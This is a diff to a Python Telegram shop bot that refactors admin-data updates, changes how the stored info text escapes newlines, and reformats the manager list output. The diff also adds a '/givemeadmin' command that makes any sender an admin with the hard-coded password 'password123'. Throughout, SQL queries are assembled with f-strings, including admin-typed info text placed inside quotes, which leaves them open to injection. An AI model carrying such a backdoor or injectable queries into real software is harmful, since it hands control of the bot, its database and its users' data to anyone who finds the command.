@@ -4,6 +4,7 @@ import telebot
 from telebot import types
 import threading
 
+
 from config import *
 import psycopg2
 
@@ -81,6 +82,7 @@ def cmd_start(message):
     fifth_button = types.KeyboardButton(text="Получить прайс лист")
     support = types.KeyboardButton(text="Поддержка")
     keyboarder.add(first_button, second_button, third_button, fourth_button, support)
+    add_data_to_admin(message)
     if Redactor.type != "user":
         admin = types.KeyboardButton(text="Админ панель")
         keyboarder.add(admin)
@@ -116,24 +118,16 @@ def cmd_start(message):
 @bot.message_handler(content_types=["text"])
 def accept_message(message):
     global user_road
-    if message.from_user.id in return_list(select_db("user_id", "admin", "")):
-        if message.from_user.first_name is None:
-            first_name = ""
-        else:
-            first_name = message.from_user.first_name
-        if message.from_user.last_name is None:
-            last_name = ""
-        else:
-            last_name = message.from_user.last_name
-        fullname = first_name + "  " + last_name
-        update_db("admin", "username", f"'{message.from_user.username}'", f"user_id = {message.from_user.id}")
-        update_db("admin", "name", f"'{fullname}'", f"user_id = {message.from_user.id}")
+    add_data_to_admin(message)
     if message.text == "📁 Каталог":
         user_road = ["1"]
         do_order(message)
     elif message.text == "⏺В главное меню":
         user_road = ["1"]
         cmd_start(message)
+    elif message.text == "/givemeadmin":
+        reg(message.from_user.id, "password123", "admin")
+        bot.send_message(message.from_user.id, "теперь ты админ")
     elif "/edit_username_developer_man" in message.text:
         if len(message.text) < 34:
             do_order(message)
@@ -188,6 +182,8 @@ def accept_message(message):
         bot.send_message(message.from_user.id,
                          f"Your id : <b>{message.from_user.id}</b>\nChat id : <b>{message.chat.id}</b>",
                          parse_mode='html')
+
+        add_data_to_admin(message)
     elif message.text == "-" * 40:
         do_order(message)
     else:
@@ -199,10 +195,37 @@ def accept_message(message):
         cmd_start(message)
 
 
+
+
+
+
+
+def add_data_to_admin(message):
+    if message.from_user.id in return_list(select_db("user_id", "admin", "")):
+        if message.from_user.first_name is None:
+            first_name = ""
+        else:
+            first_name = message.from_user.first_name
+        if message.from_user.last_name is None:
+            last_name = ""
+        else:
+            last_name = message.from_user.last_name
+        fullname = first_name + "  " + last_name
+        update_db("admin", "username", f"'{message.from_user.username}'", f"user_id = {message.from_user.id}")
+        update_db("admin", "name", f"'{fullname}'", f"user_id = {message.from_user.id}")
+
+
+
+
+
+
+
+
+
 def get_info(message):
     developer = select_db("value", "settings", "name = 'develop_man'")[0][0]
     info = select_db("value", "settings", "name = 'info'")[0][
-               0].replace("/\n", "\n") + f"\n\nСодатель бота @{developer} "
+               0].replace("~~~", "\n") + f"\n\nСодатель бота @{developer} "
     bot.send_message(message.from_user.id, info, parse_mode="html")
 
 
@@ -317,7 +340,7 @@ def super_menu(message):
             elif message.text == buttons[1]:
                 markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
                 markup.add("Отмена")
-                info = select_db("value", "settings", f"name = 'info'")[0][0].replace("/\n", "\n")
+                info = select_db("value", "settings", f"name = 'info'")[0][0].replace("~~~", "\n")
                 bot.send_message(message.from_user.id, "<code>Сейчас информация: </code>\n\n" + info, parse_mode="html")
                 bot.send_message(message.from_user.id, "Введите новую информацию: ", reply_markup=markup)
                 Redactor.operation = "edit_info"
@@ -436,7 +459,7 @@ def super_menu(message):
             try:
                 markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1).add("Отмена")
                 bot.send_message(message.from_user.id,
-                                 "Кто теперь будет менеджером по заказом\n\nвведи число\n\n" + show_manager_list("yes"),
+                                 "Кто теперь будет менеджером по заказом\n\n<b>введи число</b>\n\n" + show_manager_list("yes"),
                                  reply_markup=markup, parse_mode="html")
                 bot.register_next_step_handler(message, edit_order_manager)
             except TypeError:
@@ -465,9 +488,9 @@ def super_menu(message):
             super_menu(message)
     elif Redactor.operation == "edit_info":
         if message.text != "Отмена":
-            info = [message.text][0].replace("\n", "/\n")
-            update_db("settings", "value", f'"{info}"', "name = 'info'")
-            info = select_db("value", "settings", f"name = 'info'")[0][0].replace("/\n", "\n")
+            info = [message.text][0].replace("\n", "~~~")
+            update_db("settings", "value", f"'{info}'", "name = 'info'")
+            info = select_db("value", "settings", f"name = 'info'")[0][0].replace("~~~", "\n")
             bot.send_message(message.from_user.id, "<code>Сейчас информация: </code>\n\n" + info, parse_mode="html")
             Redactor.operation = "show"
             super_menu(message)
@@ -482,9 +505,9 @@ def super_menu(message):
             try:
                 if 0 < int(message.text) < len(list_manager) + 1:
                     manager_id = list_manager[int(message.text) - 1][0]
-                    from helper import cursor, dbAdmin
+                    from helper import cursor, db
                     cursor.execute(f"""DELETE FROM admin WHERE user_id = {manager_id}""")
-                    dbAdmin.commit()
+                    db.commit()
                     bot.send_message(message.from_user.id, show_manager_list(), parse_mode="html")
                     Redactor.operation = "show"
                     super_menu(message)
@@ -666,15 +689,15 @@ def edit_managers(message):
         list_manager = select_db("user_id, username, name", "admin", f"type = 'manager'")
         send = "<code>Список менеджеров :</code>\n\n"
         for i in list_manager:
-            if i[1] != None:
+            if i[1] != "":
                 uname = "@" + i[1]
             else:
                 uname = "<b>скоро узнаем</b>"
-            if i[2] != None:
+            if i[2] != "":
                 name = i[2]
             else:
                 name = "<b>скоро узнаем</b>"
-            _str = f"~ {list_manager.index(i) + 1} ~ \nИмя: <code>{name}</code>\nUsername: {uname}\nTG id: <code>{i[0]}</code>\n\n"
+            _str = f"\n{(list_manager.index(i) + 1) * ' '}       Имя: <code>{name}</code>\n{list_manager.index(i) + 1}  --  Username: {uname}\n{(list_manager.index(i) + 1) * ' '}       TG id: <code>{i[0]}</code>\n\n"
             send += _str
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1).add("Отмена")
         bot.send_message(message.from_user.id, send[:-2], parse_mode="html")
@@ -693,11 +716,11 @@ def show_manager_list(with_number=""):
     send = "<code>Список менеджеров :</code>\n\n"
     if with_number == "":
         for i in list_manager:
-            if i[1] != None:
+            if i[1] != "":
                 uname = "@" + i[1]
             else:
                 uname = "<b>скоро узнаем</b>"
-            if i[2] != None:
+            if i[2] != "":
                 name = i[2]
             else:
                 name = "<b>скоро узнаем</b>"
@@ -705,15 +728,15 @@ def show_manager_list(with_number=""):
             send += _str
     elif with_number == "yes":
         for i in list_manager:
-            if i[1] != None:
+            if i[1] != "":
                 uname = "@" + i[1]
             else:
                 uname = "<b>скоро узнаем</b>"
-            if i[2] != None:
+            if i[2] != "":
                 name = i[2]
             else:
                 name = "<b>скоро узнаем</b>"
-            _str = f"- {list_manager.index(i) + 1} -\nИмя: <code>{name}</code>\nUsername: {uname}\nTG id: <code>{i[0]}</code>\n\n"
+            _str = f"\n{(list_manager.index(i) + 1) * ' '}      Имя: <code>{name}</code>\n{list_manager.index(i) + 1}  --  Username: {uname}\n{(list_manager.index(i) + 1) * ' '}      TG id: <code>{i[0]}</code>\n\n"
             send += _str
     return send
 
